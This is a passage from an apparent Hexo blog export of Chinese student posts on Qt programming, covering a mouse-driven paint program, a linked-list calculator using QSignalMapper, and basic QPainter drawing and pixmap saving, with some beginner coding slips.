<h3 id="三、paint类protected成员"><a href="#三、paint类protected成员" class="headerlink" title="三、paint类protected成员"></a>三、paint类protected成员</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected:</span><br><span class="line">    void mousePressEvent(QMouseEvent *event);&#x2F;&#x2F;鼠标按下事件</span><br><span class="line">    void mouseMoveEvent(QMouseEvent *event);&#x2F;&#x2F;鼠标移动事件</span><br><span class="line">    void mouseReleaseEvent(QMouseEvent *);&#x2F;&#x2F;鼠标释放事件</span><br><span class="line">    void paintEvent(QPaintEvent*);&#x2F;&#x2F;绘画事件</span><br></pre></td></tr></table></figure>
<p>函数定义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::mousePressEvent(QMouseEvent *event)</span><br><span class="line">&#123;</span><br><span class="line">    start&#x3D;event-&gt;pos();&#x2F;&#x2F;获得鼠标点击坐标</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void paint::mouseReleaseEvent(QMouseEvent *event)</span><br><span class="line">&#123;</span><br><span class="line">    end&#x3D;event-&gt;pos();</span><br><span class="line">    qDebug()&lt;&lt;start&lt;&lt;endl&lt;&lt;end&lt;&lt;endl;</span><br><span class="line">    QPainter *painter&#x3D;new QPainter(pix);</span><br><span class="line">    painter-&gt;setPen(pen);&#x2F;&#x2F;设置线条属性</span><br><span class="line">    painter-&gt;setBrush(brush);&#x2F;&#x2F;设置笔刷属性</span><br><span class="line">    switch (status) &#123;</span><br><span class="line">    case 1:&#x2F;&#x2F;画直线</span><br><span class="line">    &#123;</span><br><span class="line">        painter-&gt;drawLine(start,end);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    case 2:&#x2F;&#x2F;画矩形</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        int width&#x3D;end.x()-start.x();</span><br><span class="line">        int height&#x3D;end.y()-start.x();</span><br><span class="line">        painter-&gt;drawRect(start.x(),start.y(),width,height);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    case 3:&#x2F;&#x2F;画椭圆</span><br><span class="line">    &#123;</span><br><span class="line">        int width&#x3D;end.x()-start.x();</span><br><span class="line">        int height&#x3D;end.y()-start.x();</span><br><span class="line">        painter-&gt;drawEllipse(start.x(),start.y(),width,height);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    this-&gt;update();</span><br><span class="line">    delete painter;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void paint::paintEvent(QPaintEvent *)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  QPainter painter(this);</span><br><span class="line">  painter.drawPixmap(QPoint(0, 0), *pix);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void paint:: mouseMoveEvent(QMouseEvent *event)</span><br><span class="line">&#123;</span><br><span class="line">    if(status&#x3D;&#x3D;4)&#x2F;&#x2F;绘制鼠标移动轨迹</span><br><span class="line">    &#123;</span><br><span class="line">        QPainter* painter&#x3D;new QPainter(pix);</span><br><span class="line">        end&#x3D;event-&gt;pos();</span><br><span class="line">        painter-&gt;setPen(pen);</span><br><span class="line">        painter-&gt;drawLine(start,end);&#x2F;&#x2F;每一次移动画直线</span><br><span class="line">        this-&gt;update();</span><br><span class="line">        start&#x3D;end;&#x2F;&#x2F;下一次绘制的开始点是这次的结束点</span><br><span class="line">        delete painter;&#x2F;&#x2F;若无delete则只可以绘制一次</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="遇到的问题和解决方法："><a href="#遇到的问题和解决方法：" class="headerlink" title="遇到的问题和解决方法："></a>遇到的问题和解决方法：</h4><p>painter在完成每次绘制时需delete，否则无法进行下一次绘制</p>
<hr>
<h3 id="四、构造函数"><a href="#四、构造函数" class="headerlink" title="四、构造函数"></a>四、构造函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">paint::paint(QWidget *parent) :</span><br><span class="line">    QMainWindow(parent),</span><br><span class="line">    ui(new Ui::paint)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(this);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;设置画布</span><br><span class="line">    pix&#x3D;new QPixmap(this-&gt;size()*5);</span><br><span class="line">    pix-&gt;fill(Qt::white);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;设置初使属性</span><br><span class="line">    brush.setColor(Qt::NoBrush);</span><br><span class="line">    status&#x3D;1;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;连接信号和槽</span><br><span class="line">    connect(ui-&gt;line,SIGNAL(triggered(bool)),this,SLOT(status_line()));</span><br><span class="line">    connect(ui-&gt;rect,SIGNAL(triggered(bool)),this,SLOT(status_rect()));</span><br><span class="line">    connect(ui-&gt;ellipse,SIGNAL(triggered(bool)),this,SLOT(status_ellipse()));</span><br><span class="line">    connect(ui-&gt;actionfree,SIGNAL(triggered(bool)),this,SLOT(status_free()));</span><br><span class="line">    connect(ui-&gt;actionred,SIGNAL(triggered(bool)),this,SLOT(change_color_red()));</span><br><span class="line">    connect(ui-&gt;actionblue,SIGNAL(triggered(bool)),this,SLOT(change_color_blue()));</span><br><span class="line">    connect(ui-&gt;actiongreen,SIGNAL(triggered(bool)),this,SLOT(change_color_green()));</span><br><span class="line">    connect(ui-&gt;actionblack,SIGNAL(triggered(bool)),this,SLOT(change_color_black()));</span><br><span class="line">    connect(ui-&gt;action2,SIGNAL(triggered(bool)),this,SLOT(penwidth2()));</span><br><span class="line">    connect(ui-&gt;action5,SIGNAL(triggered(bool)),this,SLOT(penwidth5()));</span><br><span class="line">    connect(ui-&gt;action8,SIGNAL(triggered(bool)),this,SLOT(penwidth8()));</span><br><span class="line">    connect(ui-&gt;action10,SIGNAL(triggered(bool)),this,SLOT(penwidth10()));</span><br><span class="line">    connect(ui-&gt;solid_line,SIGNAL(triggered(bool)),this,SLOT(set_solid()));</span><br><span class="line">    connect(ui-&gt;dash_line,SIGNAL(triggered(bool)),this,SLOT(set_dash()));</span><br><span class="line">    connect(ui-&gt;dash_dot,SIGNAL(triggered(bool)),this,SLOT(set_dashdot()));</span><br><span class="line">    connect(ui-&gt;dash_dot_dot,SIGNAL(triggered(bool)),this,SLOT(set_dashdotdot()));</span><br><span class="line">    connect(ui-&gt;dot_line,SIGNAL(triggered(bool)),this,SLOT(set_dot()));</span><br><span class="line">    connect(ui-&gt;fred,SIGNAL(triggered(bool)),this,SLOT(set_fill_red()));</span><br><span class="line">    connect(ui-&gt;fblue,SIGNAL(triggered(bool)),this,SLOT(set_fill_blue()));</span><br><span class="line">    connect(ui-&gt;fblack,SIGNAL(triggered(bool)),this,SLOT(set_fill_black()));</span><br><span class="line">    connect(ui-&gt;fgreen,SIGNAL(triggered(bool)),this,SLOT(set_fill_green()));</span><br><span class="line">    connect(ui-&gt;solid_pattern,SIGNAL(triggered(bool)),this,SLOT(set_solid_pattern()));</span><br><span class="line">    connect(ui-&gt;dense_pattern,SIGNAL(triggered(bool)),this,SLOT(set_dense_pattern()));</span><br><span class="line">    connect(ui-&gt;none,SIGNAL(triggered(bool)),this,SLOT(set_none_pattern()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="遇到的问题和解决方法：-1"><a href="#遇到的问题和解决方法：-1" class="headerlink" title="遇到的问题和解决方法："></a>遇到的问题和解决方法：</h4><ul>
<li>可以获得鼠标事件坐标，但无法绘制，解决方法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pix&#x3D;new QPixmap(this-&gt;size()*5);&#x2F;&#x2F;结构函数</span><br><span class="line">QPainter *painter&#x3D;new QPainter(pix);&#x2F;&#x2F;绘制函数</span><br></pre></td></tr></table></figure></li>
<li>点击menubar中label发出的信号槽函数无法接收到：<br>原connect写法：<br><code>connect(ui-&gt;line,SIGNAL(clicked()),this,SLOT(status_line()));</code><br>将<code>clicked()</code>改为<code>triggered(bool)</code>即可</li>
</ul>
<hr>
<h3 id="五、槽函数："><a href="#五、槽函数：" class="headerlink" title="五、槽函数："></a>五、槽函数：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public slots:</span><br><span class="line">    &#x2F;&#x2F;设置绘制形状</span><br><span class="line">    void status_line();</span><br><span class="line">    void status_rect();</span><br><span class="line">    void status_ellipse();</span><br><span class="line">    void status_free();&#x2F;&#x2F;绘制鼠标轨迹</span><br><span class="line">    &#x2F;&#x2F;设置线条颜色</span><br><span class="line">    void change_color_blue();</span><br><span class="line">    void change_color_red();</span><br><span class="line">    void change_color_green();</span><br><span class="line">    void change_color_black();</span><br><span class="line">    &#x2F;&#x2F;设置线条宽度</span><br><span class="line">    void penwidth2();</span><br><span class="line">    void penwidth5();</span><br><span class="line">    void penwidth8();</span><br><span class="line">    void penwidth10();</span><br><span class="line">    &#x2F;&#x2F;设置线条样式</span><br><span class="line">    void set_solid();</span><br><span class="line">    void set_dash();</span><br><span class="line">    void set_dot();</span><br><span class="line">    void set_dashdot();</span><br><span class="line">    void set_dashdotdot();</span><br><span class="line">    &#x2F;&#x2F;设置填充颜色</span><br><span class="line">    void set_fill_red();</span><br><span class="line">    void set_fill_blue();</span><br><span class="line">    void set_fill_green();</span><br><span class="line">    void set_fill_black();</span><br><span class="line">    &#x2F;&#x2F;设置填充样式</span><br><span class="line">    void set_solid_pattern();</span><br><span class="line">    void set_dense_pattern();</span><br><span class="line">    void set_none_pattern();</span><br></pre></td></tr></table></figure>
<h4 id="槽函数定义示例："><a href="#槽函数定义示例：" class="headerlink" title="槽函数定义示例："></a>槽函数定义示例：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::status_line()</span><br><span class="line">&#123;</span><br><span class="line">    status&#x3D;1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::change_color_red()</span><br><span class="line">&#123;</span><br><span class="line">    pen.setColor(Qt::red);</span><br><span class="line">    &#x2F;&#x2F;注意书写格式，不可以写为pen.setColor(&quot;red&quot;);否则无法传入颜色</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::penwidth5()</span><br><span class="line">&#123;</span><br><span class="line">    pen.setWidth(5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_dash()</span><br><span class="line">&#123;</span><br><span class="line">    pen.setStyle(Qt::DashLine);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_fill_blue()</span><br><span class="line">&#123;</span><br><span class="line">    brush.setColor(Qt::blue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_dense_pattern()</span><br><span class="line">&#123;</span><br><span class="line">    brush.setStyle(Qt::Dense7Pattern);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_none_pattern()</span><br><span class="line">&#123;</span><br><span class="line">    brush.setStyle(Qt::NoBrush);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="遇到的问题和解决方法"><a href="#遇到的问题和解决方法" class="headerlink" title="遇到的问题和解决方法"></a>遇到的问题和解决方法</h4><ul>
<li>信号和槽函数无法连接：<ul>
<li>检查信号和发送信号的来源是否对应</li>
<li>检查信号和槽的拼写是否准确</li>
<li>利用qDebug()进行调试</li>
</ul>
</li>
<li>brush必须设置填充样式，否则无法填充</li>
</ul>
<hr>
<h3 id="六、成果展示"><a href="#六、成果展示" class="headerlink" title="六、成果展示"></a>六、成果展示</h3><p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/v86upj0wwx905xyzftjgvh3j/image_1df8akslg1oo5li7b5jp314rb16.png"  alt="image_1df8akslg1oo5li7b5jp314rb16.png-79.6kB"></p>
]]></content>
      <categories>
        <category>Qt</category>
      </categories>
      <tags>
        <tag>Qt</tag>
        <tag>大一</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt作业一：计算器</title>
    <url>/2019/08/31/Qt/Qt%E4%BD%9C%E4%B8%9A%E4%B8%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ui界面对应的ui-h文件的作用："><a href="#ui界面对应的ui-h文件的作用：" class="headerlink" title="ui界面对应的ui_*.h文件的作用："></a>ui界面对应的ui_*.h文件的作用：</h2><p>ui_.h是ui界面的代码化表达，<br>即用非Qt软件打开ui文件时会显示ui_*.h文件，用代码描述ui界面内容</p>
<hr>
<h2 id="计算器程序："><a href="#计算器程序：" class="headerlink" title="计算器程序："></a>计算器程序：</h2><h3 id="1-通过Qt-designer设计界面："><a href="#1-通过Qt-designer设计界面：" class="headerlink" title="1.通过Qt designer设计界面："></a>1.通过Qt designer设计界面：</h3><p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/exg4t6ijsh7pnvnj0rpwgmm8/image_1deo6ig6qdpc1jdn1h1te6e1sk01m.png"  alt="image_1deo6ig6qdpc1jdn1h1te6e1sk01m.png-236.7kB"></p>
<h4 id="出现的问题和解决方法："><a href="#出现的问题和解决方法：" class="headerlink" title="出现的问题和解决方法："></a>出现的问题和解决方法：</h4><ul>
<li>窗口对象名（QWidget类）要和对窗口进行操作的父类类名一致，否则会提示“引用了不完整的类型”</li>
<li>注意修改按钮名称以便下一步</li>
</ul>
<h3 id="2-使用QSignalMapper："><a href="#2-使用QSignalMapper：" class="headerlink" title="2.使用QSignalMapper："></a>2.使用QSignalMapper：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signalmapper&#x3D;new QSignalMapper (this);</span><br><span class="line">QObjectList list &#x3D;this-&gt;children();&#x2F;&#x2F;list为全部按钮</span><br><span class="line">foreach(QObject *oc,list)&#x2F;&#x2F;遍历list中的按钮</span><br><span class="line">&#123;</span><br><span class="line">    if(oc-&gt;objectName()!&#x3D;&quot;gridLayout&quot;&amp;&amp;oc-&gt;objectName()!&#x3D;&quot;display&quot;&amp;&amp;oc-&gt;objectName()!&#x3D;&quot;&quot;)&#x2F;&#x2F;排除不需要链接槽函数clicked()的多余按钮</span><br><span class="line">    &#123;</span><br><span class="line">        QPushButton *pushbutton&#x3D;qobject_cast&lt;QPushButton *&gt;(oc);&#x2F;&#x2F;利用qobject——cast进行类型转换</span><br><span class="line">        connect(pushbutton,SIGNAL(clicked()),signalmapper,SLOT(map()));&#x2F;&#x2F;将信号链接到signnalmapper上</span><br><span class="line">        signalmapper-&gt;setMapping(pushbutton,pushbutton-&gt;text());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">connect(signalmapper,SIGNAL(mapped(QString)),this,SLOT(clicked(QString)));&#x2F;&#x2F;将signalmapper连接至槽函数clicked（QString）上，即实现将所需按钮链接至一个槽函数</span><br></pre></td></tr></table></figure>

<h4 id="出现的问题和解决方法：-1"><a href="#出现的问题和解决方法：-1" class="headerlink" title="出现的问题和解决方法："></a>出现的问题和解决方法：</h4><ul>
<li>理解QSignalMapper的工作原理和方法：<br>  qsignalmapper:相当于一个信号转发器，将多个按钮信号连接到一个槽函数上（详见代码注释）<br>  引入QSignalMapper头文件<br>  还有一种获取按钮列表的方法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QString buttontext &#x3D; &quot;btn1,btn2,btn3,btn4,btn5,btn6,btn7,btn8,btn9,btn10&quot;; </span><br><span class="line">QStringList texts &#x3D; buttontext.split(&quot;,&quot;);</span><br></pre></td></tr></table></figure>
也可利用按钮名字的共性筛选出所需要的按钮：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(oc-&gt;nbjectName.starswith(&quot;***&quot;)</span><br></pre></td></tr></table></figure></li>
<li>最初设计ui时将所有按钮放到了gridlayout下，结果到至按钮无法访问，将按钮挪出gridlayout，若需使按钮排列整齐，designer界面上方有辅助排列功能按键。</li>
</ul>
<p>###3.计算功能的实现：<br>头文件声明：</p>
<ul>
<li>node类</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    class node</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    node();</span><br><span class="line">    double data;&#x2F;&#x2F;字符串转成double后存储在data中</span><br><span class="line">    QString sign;&#x2F;&#x2F;如果时运算符节点，用sign记录运算符</span><br><span class="line">    QString nums;&#x2F;&#x2F;以字符串形式存储double类型的数据</span><br><span class="line">    node* next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>widget类：//计算器类</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/0rjzz44tj1tybvzvwublr5p9/image_1den8jsp2cvi120b1183p941e3tm.png"  alt="image_1den8jsp2cvi120b1183p941e3tm.png-194.6kB"></p>
<ul>
<li>将按钮上的内容输入到字符串中：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Widget::clicked(QString ch)</span><br><span class="line">&#123;</span><br><span class="line">    if(ch&#x3D;&#x3D;&quot;sqrt&quot;)</span><br><span class="line">        opt.append(&quot;k&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;square&quot;)</span><br><span class="line">        opt.append(&quot;p&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;rev&quot;)</span><br><span class="line">        opt.append(&quot;d&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;neg&quot;)</span><br><span class="line">        opt.append(&quot;f&quot;);</span><br><span class="line">    else if(ch&#x3D;&#x3D;&quot;&#x3D;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        opt.append(&quot;&#x3D;\0&quot;);</span><br><span class="line">        cal();</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        opt.append(ch);</span><br><span class="line">    &#125;</span><br><span class="line">    ui-&gt;display-&gt;setPlainText(opt);&#x2F;&#x2F;显示输入内容</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>将字符串转成链表<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/3bzdgoa177er00batvrsitu8/image_1den9fkk8r1mvuu2cn130g14c21g.png"  alt="image_1den9fkk8r1mvuu2cn130g14c21g.png-198kB"><ul>
<li>QString 转 double：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t-&gt;data&#x3D;t-&gt;nums.toDouble;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>实现节点与节点的计算<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Widget::calculate(node*a,node*b,node*c)</span><br><span class="line">&#123;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;+&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data + c-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;-&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data - c-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;*&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data * c-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;&#x2F;&#39;)</span><br><span class="line">        a-&gt;data &#x3D; a-&gt;data &#x2F; c-&gt;data;</span><br><span class="line">&#x2F;&#x2F;节点合并</span><br><span class="line">    if (tail !&#x3D; c)</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;next&#x3D;c-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;next&#x3D;nullptr;</span><br><span class="line">        tail&#x3D;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Widget::  calculate(node*a,node*b)</span><br><span class="line">&#123;</span><br><span class="line">   if (b-&gt;sign &#x3D;&#x3D; &#39;k&#39;)</span><br><span class="line">        a-&gt;data &#x3D; sqrt(a-&gt;data);</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;p&#39;)</span><br><span class="line">        a-&gt;data *&#x3D; a-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;d&#39;)</span><br><span class="line">        a-&gt;data &#x3D; 1 &#x2F; a-&gt;data;</span><br><span class="line">    if (b-&gt;sign &#x3D;&#x3D; &#39;f&#39;)</span><br><span class="line">        a-&gt;data &#x3D; -a-&gt;data;</span><br><span class="line">    if(b!&#x3D;tail)</span><br><span class="line">        a-&gt;next &#x3D; b-&gt;next;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;next &#x3D; nullptr;</span><br><span class="line">        tail &#x3D; a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>计算样例<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/69dz89gzml1ewgor9s4az111/image_1deo6udbc13io132bduhi37lcs1c.png"  alt="image_1deo6udbc13io132bduhi37lcs1c.png-194.7kB"><br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/hzc5rc84go6osgaubhe4hpkk/image_1deo711q21576823lu110ue3l81p.png"  alt="image_1deo711q21576823lu110ue3l81p.png-198.2kB"></li>
</ul>
]]></content>
      <categories>
        <category>Qt</category>
      </categories>
      <tags>
        <tag>Qt</tag>
        <tag>大一</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt绘图</title>
    <url>/2019/08/31/Qt/Qt%E7%BB%98%E5%9B%BE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>绘图设备：<ul>
<li>QPixmap：针对屏幕进行优化，和平台相关，不能对图片进行修改</li>
<li>QImage：和平台无关，可以对图片进行修改，在线程中绘图</li>
<li>QPicture：将绘图状态保存为一个二进制文件</li>
</ul>
</li>
</ul>
<p>用法相同，但作用有区别</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ifndef MAINWINDOW_H</span><br><span class="line">#define MAINWINDOW_H</span><br><span class="line"></span><br><span class="line">#include &lt;QMainWindow&gt;</span><br><span class="line"></span><br><span class="line">namespace Ui &#123;</span><br><span class="line">class MainWindow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MainWindow : public QMainWindow</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    explicit MainWindow(QWidget *parent &#x3D; nullptr);</span><br><span class="line">    ~MainWindow();</span><br><span class="line"></span><br><span class="line">protected:</span><br><span class="line">    &#x2F;&#x2F;重写绘图事件，虚函数</span><br><span class="line">    &#x2F;&#x2F;如果在窗口绘图，不许放在绘图事件里实现</span><br><span class="line">    &#x2F;&#x2F;绘图事件内部自动调用，窗口需要重绘的时候（状态改变）</span><br><span class="line">    void paintEvent(QPaintEvent*);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private slots:</span><br><span class="line">    void on_pushButton_clicked();</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">    Ui::MainWindow *ui;</span><br><span class="line">    int x;</span><br><span class="line">    int y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#endif &#x2F;&#x2F; MAINWINDOW_H</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;mainwindow.h&quot;</span><br><span class="line">#include &quot;ui_mainwindow.h&quot;</span><br><span class="line">#include &lt;QPainter&gt;</span><br><span class="line">#include &lt;QDebug&gt;</span><br><span class="line">#include &lt;QBrush&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MainWindow::MainWindow(QWidget *parent) :</span><br><span class="line">    QMainWindow(parent),</span><br><span class="line">    ui(new Ui::MainWindow)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(this);</span><br><span class="line">    x&#x3D;0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MainWindow::~MainWindow()</span><br><span class="line">&#123;</span><br><span class="line">    delete ui;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void MainWindow::paintEvent(QPaintEvent* )</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;QPainter p(this);与下面两个等价</span><br><span class="line">    QPainter p;&#x2F;&#x2F;创建画家对象</span><br><span class="line">    p.begin(this);&#x2F;&#x2F;指定当前窗口为绘图设备</span><br><span class="line">    &#x2F;&#x2F;绘图操作</span><br><span class="line">    &#x2F;&#x2F;p.drawxxx();各种绘图样式</span><br><span class="line">    &#x2F;&#x2F;画背景图</span><br><span class="line">    &#x2F;&#x2F;p.drawPixmap(0,0,width(),height(),QPixmap(&quot;E:&#x2F;study&#x2F;qt&#x2F;code&#x2F;bb6a99488e1385c992bf0ad07392ccaa.jpeg&quot;));</span><br><span class="line">    p.drawPixmap(rect(),QPixmap(&quot;E:&#x2F;study&#x2F;qt&#x2F;code&#x2F;bb6a99488e1385c992bf0ad07392ccaa.jpeg&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;自定义画笔</span><br><span class="line">    QPen pen;</span><br><span class="line">    pen.setWidth(5);&#x2F;&#x2F;设置线宽</span><br><span class="line">    &#x2F;&#x2F;pen.setColor(Qt::red);</span><br><span class="line">    pen.setColor(QColor(14,9,234));&#x2F;&#x2F;RGB设置颜色</span><br><span class="line">    pen.setStyle(Qt::SolidLine);&#x2F;&#x2F;设置风格</span><br><span class="line">    &#x2F;&#x2F;把画笔交给画家</span><br><span class="line">    p.setPen(pen);</span><br><span class="line">    &#x2F;&#x2F;画直线</span><br><span class="line">    p.drawLine(50,50,150,50);</span><br><span class="line">    p.drawLine(50,50,50,150);</span><br><span class="line">    &#x2F;&#x2F;创建画刷对象</span><br><span class="line">    QBrush brush;</span><br><span class="line">    brush.setColor(Qt::red);</span><br><span class="line">    brush.setStyle(Qt::Dense1Pattern);&#x2F;&#x2F;设置样式</span><br><span class="line">    p.setBrush(brush);</span><br><span class="line">    &#x2F;&#x2F;画矩形</span><br><span class="line">    p.drawRect(150,150,100,50);</span><br><span class="line">    &#x2F;&#x2F;画圆形</span><br><span class="line">    p.drawEllipse(QPoint(150,150),50,25);</span><br><span class="line">    &#x2F;&#x2F;画笑脸</span><br><span class="line">    p.drawPixmap(x,500,300,200,QPixmap(&quot;C:&#x2F;Users&#x2F;lxm&#x2F;Pictures&#x2F;Saved Pictures&#x2F;明信片16.jpg&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.end();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void MainWindow::on_pushButton_clicked()</span><br><span class="line">&#123;</span><br><span class="line">    x+&#x3D;20;</span><br><span class="line">    if(x&gt;width())</span><br><span class="line">    &#123;</span><br><span class="line">        x&#x3D;0;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;刷新窗口，让整个窗口重绘</span><br><span class="line">    update();&#x2F;&#x2F;简介调用paintEvent（）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>保存图片<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;mainwindow.h&quot;</span><br><span class="line">#include &quot;ui_mainwindow.h&quot;</span><br><span class="line">#include &lt;QPainter&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MainWindow::MainWindow(QWidget *parent) :</span><br><span class="line">    QMainWindow(parent),</span><br><span class="line">    ui(new Ui::MainWindow)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(this);</span><br><span class="line">    &#x2F;&#x2F;绘图设备，400*300</span><br><span class="line">    QPixmap pixmap(400,300);</span><br><span class="line">    QPainter p(&amp;pixmap);</span><br><span class="line">    &#x2F;&#x2F;填充白色</span><br><span class="line">    p.fillRect(0,0,400,300,QBrush(Qt::white));</span><br><span class="line">    p.drawPixmap(0,0,80,80,QPixmap(&quot;C:&#x2F;Users&#x2F;lxm&#x2F;Pictures&#x2F;3e40d65390723ce873e88385b4d57bff.jpeg&quot;));</span><br><span class="line">    &#x2F;&#x2F;保存图片</span><br><span class="line">    pixmap.save(&quot;..&#x2F;pixmap.png&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MainWindow::~MainWindow()</span><br><span class="line">&#123;</span><br><span class="line">    delete ui;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Qt</category>
      </categories>
      <tags>
        <tag>Qt</tag>
        <tag>大一</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt的框架</title>
